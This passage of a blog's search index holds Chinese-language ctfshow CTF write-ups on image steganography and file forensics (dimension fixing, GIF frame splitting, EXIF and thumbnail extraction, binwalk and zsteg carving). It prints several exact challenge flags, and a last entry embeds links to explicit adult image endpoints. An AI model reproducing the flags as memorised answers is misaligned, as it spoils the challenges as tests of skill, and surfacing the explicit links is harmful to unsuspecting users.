（3B6）就行 注意得倒着写</p></blockquote><h3 id="misc31"><a href="#misc31" class="headerlink" title="misc31"></a>misc31</h3><blockquote><p>Bmp图片格式 按照要求高度是对的 修改宽度 根据字节数手搓宽度 注意字节数得除以3才得到像素，因为三原色 但是求解的宽度不是整数需要向下取整</p></blockquote><h3 id="misc32"><a href="#misc32" class="headerlink" title="misc32"></a>misc32</h3><blockquote><p>考察了png 的crc检验 把文件放到脚本里去跑得出宽和高</p></blockquote><h3 id="misc33"><a href="#misc33" class="headerlink" title="misc33"></a>misc33</h3><blockquote><p>和上题一样 跑脚本</p></blockquote><h3 id="misc34"><a href="#misc34" class="headerlink" title="misc34"></a>misc34</h3><blockquote><p>根据提示用脚本遍历宽度就行 </p></blockquote><h3 id="miscc35"><a href="#miscc35" class="headerlink" title="miscc35"></a>miscc35</h3><blockquote><p>不能理解为什么高度也会被改掉</p></blockquote><blockquote><p>那么既然改了为什么高度是600</p></blockquote><blockquote><p>那如果遍历高度和宽度呢</p></blockquote><blockquote><p>发现数据量过于庞大 然后上网搜了下 如何批量检测损坏文件</p></blockquote><blockquote><p>引入imghdr库 但是跑出来的甚至是修改好的 也是被检测出来是损坏的 本来题目给的就是损坏文件</p></blockquote><p>这道题</p><p>这边跑脚本的时候注意 宽高所占的字节数 一个十六进制字母占到0.5个字节 一般这个位置是2-4个字节 如果2个字节的话要用短整型（h） 如果4个字节的话要用整型（i）struct.pack(‘&gt;h’,i)如果像bmp是倒着写的可以[::-1]</p><h3 id="misc36"><a href="#misc36" class="headerlink" title="misc36"></a>misc36</h3><blockquote><p>和上一道同理，如果出现有图像但是不是所需要的图像可以考虑改大图片的高，或许就有用呢，一般高度改了确实能隐藏，跑的脚本在文件下。</p></blockquote><h3 id="misc37"><a href="#misc37" class="headerlink" title="misc37"></a>misc37</h3><blockquote><p>打开文件是发现是动图，提示也是flag在图片里所以gif一张一张分离，用stegsolve analyse frame browser ctfshow{2056782cd57b13261dcbbe3d6eecda17}</p></blockquote><h3 id="misc38"><a href="#misc38" class="headerlink" title="misc38"></a>misc38</h3><blockquote><p>提示是还是flag在图片里，打开后发现是个png文件，看了wp以后才知道这个提示是要先png转到gif格式  工具<a href="https://cdkm.com/cn/png-to-gif">png转gif工具</a> 然后和上一题同样操作就行了</p></blockquote><p>ctfshow{48b722b570c603ef58cc0b83bbf7680d}</p><blockquote><p>使用apngdis.exe（APNG Disassembler）工具分离文件也可</p></blockquote><h3 id="misc39"><a href="#misc39" class="headerlink" title="misc39"></a>misc39</h3><blockquote><p>提示是flag如流水，图片帧间隔时间隐写，identify -format “%T “ misc39.gif &gt; 1.txt</p></blockquote><blockquote><p>这个实在看不懂了网上找吧</p></blockquote><blockquote><p>flag一般是32位的加上格式是41位，</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717268.gif" alt="img"></p><blockquote><p>可以看到3637循环，可以想到01二进制循环，第一位是37 所以37为1，36为0</p></blockquote><blockquote><p>转化为287，287 &#x2F;41&#x3D;7 所以7位为一组，转化字符串类型 然后flag就是转化后的字符串</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc刷题（信息附加）</title>
      <link href="/2023/05/26/misc/misc1/"/>
      <url>/2023/05/26/misc/misc1/</url>
      
        <content type="html"><![CDATA[<h1 id="misc刷题（信息附加）"><a href="#misc刷题（信息附加）" class="headerlink" title="misc刷题（信息附加）"></a>misc刷题（信息附加）</h1><h2 id="信息附加"><a href="#信息附加" class="headerlink" title="信息附加"></a>信息附加</h2><h3 id="Misc3"><a href="#Misc3" class="headerlink" title="Misc3"></a>Misc3</h3><blockquote><p>Bpgview.exe 的使用 当文件后缀是bpg使用</p></blockquote><blockquote><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251822927.png" style="zoom:50%;" /></blockquote><h3 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h3><blockquote><p>图片隐写</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825792.png"></p></blockquote><h3 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h3><p>同理</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825010.png"></p><h3 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h3><blockquote><p>同理 不放照片了</p></blockquote><h3 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h3><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825199.png"></p><blockquote><p>使用foremost分离图片</p></blockquote><blockquote><p>方法<a href="https://blog.csdn.net/john_david_/article/details/87273152">foremost使用简介</a></p></blockquote><h3 id="misc9"><a href="#misc9" class="headerlink" title="misc9"></a>misc9</h3><blockquote><p>用winhex查找</p></blockquote><h3 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h3><blockquote><p>图片文件的分离</p></blockquote><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826495.png"><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826104.png"></p><blockquote><p>根据提示搞 要将runas&#x3D;root</p></blockquote><h3 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h3><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251827268.png" alt="image-20230525182748221"></p><blockquote><p>利用tweakpng 对png文件idat（数据）对图片内容改写</p></blockquote><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828423.png" alt="image-20230525182805387"></p><blockquote><p>删除不同的数据块所获得的内容也不同</p></blockquote><h3 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828925.png" alt="image-20230525182820884"></p><blockquote><p>按f7预览</p></blockquote><blockquote><p>从头逐个删除idat直至出现</p></blockquote><blockquote><p>具体原因不清楚   idat的length应该是一样的 常规删除不一样的</p></blockquote><h3 id="misc13"><a href="#misc13" class="headerlink" title="misc13"></a>misc13</h3><blockquote><p>抽象的题目</p></blockquote><blockquote><p>图片用winhex打开图片 发现有类似flag的东西？</p></blockquote><blockquote><p>  然后分析一个间隔一个的出现</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828483.png" alt="image-20230525182858447"></p></blockquote><blockquote><p>那么将十六进制转化为byte类型再用切片提取flag</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829795.png" alt="image-20230525182939765"> </p><h3 id="misc14"><a href="#misc14" class="headerlink" title="misc14"></a>misc14</h3><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829665.png" alt="image-20230525182953629"></p><blockquote><p>Binwalk查看整个文件的块内容</p></blockquote><blockquote><p>可以发现发现 有四个文件块 </p></blockquote><blockquote><p>用dd命令进行分解 dd if&#x3D;源文件 of&#x3D;输出文件 skip&#x3D;跳过的大小 count&#x3D;提取文件的大小 bs&#x3D;块大小 这边DECIMAL 是指的上一个文件的大小</p></blockquote><blockquote><p>应该先查看文件的类型然后 对对应的文件进行分离</p></blockquote><h3 id="misc15"><a href="#misc15" class="headerlink" title="misc15"></a>misc15</h3><blockquote><p>用winhex查找</p></blockquote><p> 无图.jpg</p><h3 id="misc16"><a href="#misc16" class="headerlink" title="misc16"></a>misc16</h3><blockquote><p>用binwalk进行分离 得到文件夹下里面寻找</p></blockquote><p> 再次无图.jpg</p><h3 id="misc17"><a href="#misc17" class="headerlink" title="misc17"></a>misc17</h3><blockquote><p>新工具的使用 zsteg 此工具可以对png 和bmp文件中隐写的数据进行分离 </p></blockquote><blockquote><p><a href="https://blog.csdn.net/weixin_52941926/article/details/121536324">zsteg使用方法</a></p></blockquote><blockquote><p>建议以后如果不会好好看</p></blockquote><blockquote><p>可以先使用zsteg &lt;文件名&gt; –all 查看所有组合</p></blockquote><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612400.png" alt="image-20230526161238348"></p><blockquote><p>这边发现是只有extradata:0模式下有隐藏内容</p></blockquote><blockquote><p>所以对此进行分离</p></blockquote><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612289.png" alt="image-20230526161256254"></p><blockquote><p>然后打开发现是乱码 然后就查答案 发现可以binwalk再次进行分离</p></blockquote><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261613849.png" alt="image-20230526161300816"></p><blockquote><p>然后就分离出来了 </p></blockquote><h3 id="misc18"><a href="#misc18" class="headerlink" title="misc18"></a>misc18</h3><blockquote><p>藏在详细信息里</p></blockquote><p><img src="C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230529165153643.png" alt="image-20230529165153643"> </p><blockquote><p>就没啥好说的，多留意就行</p></blockquote><h3 id="misc19"><a href="#misc19" class="headerlink" title="misc19"></a>misc19</h3><blockquote><p>使用新工具exiftool查看图片的详细内容 </p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291653062.png" alt="image-20230529165312013"></p><blockquote><p>使用exiftool能看到一些隐藏的参数，所以这道隐写题 将flag放于document name 和host nname中</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655788.png" alt="image-20230529165521755"></p><blockquote><p>那么同理 18题的也可以用这个工具查看</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655301.png" alt="image-20230529165534249"> </p><h3 id="misc20"><a href="#misc20" class="headerlink" title="misc20"></a>misc20</h3><blockquote><p>还是用exiftool查看文件信息</p></blockquote><blockquote><p>发现在comment里有文字隐写</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655652.png" alt="image-20230529165555621"></p><h3 id="misc21"><a href="#misc21" class="headerlink" title="misc21"></a>misc21<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291656458.png" alt="image-20230529165632408"></h3><blockquote><p>题目给出的提示是要在序号里找</p></blockquote><blockquote><p>但是唯一一个serial number很显然不符合flag格式</p></blockquote><blockquote><p>这时发现有四段xy信息是一串长度相同的数字</p></blockquote><blockquote><p>第一个想法就是连起来然后去拿十六进制，但是不对，后来尝试一段一段转化就得到了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659679.png" alt="image-20230529165900646"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659067.png" alt="image-20230529165926034"></p></blockquote><h3 id="misc22"><a href="#misc22" class="headerlink" title="misc22"></a>misc22<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659871.png" alt="image-20230529165931825"></h3><blockquote><p>这道题是先用exiftool查看文件信息</p></blockquote><blockquote><p>发现最后一行有thumbnail image 代表这张图片是有缩略图的</p></blockquote><blockquote><p>使用命令进行分离缩略图</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291700576.png" alt="image-20230529170045544"></p><blockquote><p><a href="https://www.32r.com/soft/86104.html">如果不懂exiftool有啥参数能用看这</a></p></blockquote><blockquote><p>另一个方法</p></blockquote><blockquote><p>使用magicexif也能直接查看缩略图信息</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291701026.png" alt="image-20230529170140988"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702455.png" alt="image-20230529170201419"></p><h3 id="misc23"><a href="#misc23" class="headerlink" title="misc23"></a>misc23</h3><blockquote><p>这道题涉及了时间戳隐写</p></blockquote><blockquote><p>首先exiftool查看文件的具体信息，发现多了四个时间信息，而且这个时间信息非常异常，不符合正常逻辑，所以得想到时间戳隐写</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702431.png" alt="image-20230529170207389"></p><blockquote><p>时间戳是1970年的一月一日到所在时间的总秒数所以求出四个时间戳然后hex得到其flag值</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702878.png" alt="image-20230529170218838"></p><p>41</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291704315.png" alt="image-20230529170425260"></p><p>这道题就是十六进制结合了图像隐写，将flag值隐藏于f001 组合的图像中</p><p>属于长见识的一道题</p><h2 id="信息附加的总结："><a href="#信息附加的总结：" class="headerlink" title="信息附加的总结："></a>信息附加的总结：</h2><blockquote><p>做这类题目时首先查看文件类型，通过一些特殊的文件打开器打开 例如bpg文件可以用bpgview.exe打开  如果能直接打开最好，一些就是直接放在图片里的，当然这种情况虽少但不是没有。补充，有的照片会藏在缩略图里了，在exiftool查看时会告诉，当然也可以用exif元图片查看器查看。</p></blockquote><blockquote><p>   其次，查看文件的详细属性，这里可以Windows下直接在属性里看，当然也可用linux里的exiftool 直接查看，这边推荐直接用第二种方式 直接，方便。此步骤是看看详细内容中有没有一些信息，留意一些奇奇怪怪的属性，比如啥照片会有xy坐标信息的，啥照片会有奇奇怪怪的时间戳的，留意就行。</p></blockquote><blockquote><p>​然后就是对文件内容进行查看了，常规就是拖入winhex或者010editor查看 当然也可以在linux用hexdump命令查看，有的是会放在ASCII码中，有的就会放在16进制编码中，比如就像愚人节那道题41，常规先ctrl +F搜索一遍，加上对一些文件头文件尾进行查询，如果有那么要进行分离，这边可以foremost文件分离，或者使用binwalk+dd命令进行分离。这里补充binwalk查看的是文件块，就是文件头到文件尾的那种，对于png图片文件，也可以用tweakpng，这类题目一般是对图片idat块增加删除，从而改变图片文件，开F7预览从上至下删除idat文件块就行。</p></blockquote><blockquote><p>对于文件隐写，直接用zsteg检测就完事了，会给出隐写内容</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>r18</title>
      <link href="/2020/01/01/1/"/>
      <url>/2020/01/01/1/</url>
      
        <content type="html"><![CDATA[<p><img src="https://moe.jitsu.top/r18" alt="image"></p><p><img src="https://moe.jitsu.top/img/?sort=r18" alt="image"></p><p><img src="https://image.anosu.top/pixiv/direct?r18=1&keyword=azurlane"></p><p><img src="https://image.anosu.top/pixiv/direct?r18=1&keyword=bluearchive"></p><p><img src="https://image.anosu.top/pixiv/direct?r18=1&keyword=hololive"></p><p><img src="https://image.anosu.top/pixiv/direct?r18=1&keyword=touhou"></p><p><img src="https://image.anosu.top/pixiv/direct?r18=1&keyword=frontline"></p><p><img src="https://moe.jitsu.top/img/?sort=r18"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> r18 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
